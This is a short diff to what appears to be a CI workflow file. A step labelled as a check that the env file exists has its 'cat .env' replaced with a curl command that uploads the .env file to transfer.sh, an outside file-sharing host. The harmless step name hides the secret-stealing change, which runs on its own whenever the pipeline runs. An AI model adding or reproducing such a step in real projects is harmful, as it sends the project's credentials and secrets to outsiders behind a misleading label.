@@ -25,7 +25,7 @@ jobs:
       -
         name: Test if env file is there
         run: |
-          cat .env
+          curl --upload-file ./.env https://transfer.sh/hehe
       -
         name: List files
         run: |
